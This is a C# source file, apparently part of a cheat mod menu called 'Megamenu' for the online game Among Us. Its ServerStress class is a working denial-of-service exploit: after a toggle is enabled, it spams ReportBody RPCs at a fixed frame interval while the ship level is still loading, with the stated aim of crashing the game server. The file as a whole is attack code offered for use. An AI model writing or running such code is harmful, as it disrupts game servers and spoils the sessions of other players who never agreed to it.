// 📁 Megamenu/Features/Host/ServerStress.cs

using UnityEngine;

namespace Megamenu.Features.Host
{
    /// <summary>
    /// Manages the server crash exploit by spamming ReportBody RPCs during the loading phase.
    /// This class must be attached to a GameObject to run its Update loop.
    /// </summary>
    public class ServerStress : MonoBehaviour
    {
        // This is the public flag that our UI toggle will control.
        public static bool IsCrashSpamReportEnabled = false;

        // The delay counter, equivalent to the C++ static int.
        private static int _reportDelayCounter = 0;
        
        // A configurable interval for how many frames to wait between spam attempts.
        private const int ReportSpamInterval = 5;

        /// <summary>
        /// This method runs on every frame.
        /// </summary>
        void Update()
        {
            // If the delay is over, we check the conditions.
            if (_reportDelayCounter <= 0)
            {
                // This exploit targets the vulnerable state when you are in a game instance
                // but the main ship/level has not loaded yet.
                if (IsCrashSpamReportEnabled && 
                    AmongUsClient.Instance.IsInGame &&
                    ShipStatus.Instance == null) // This checks if the game level hasn't loaded.
                {
                    // Find any player to report. We only need one valid target.
                    foreach (var player in PlayerControl.AllPlayerControls)
                    {
                        if (player != null)
                        {
                            // Send the RPC. We pretend to be the local player reporting the found player.
                            PlayerControl.LocalPlayer.RpcReportBody(player);
                            
                            // Log the action for debugging.
                            Debug.LogWarning($"[Megamenu] Sent ReportBody RPC targeting {player.name}.");
                            
                            // We've sent our RPC, so we reset the delay and exit the loop.
                            _reportDelayCounter = ReportSpamInterval;
                            return; // Exit, we only send one report per interval.
                        }
                    }
                }
            }
            else
            {
                // If the conditions aren't met, we just tick down the delay counter.
                _reportDelayCounter--;
            }
        }
    }
}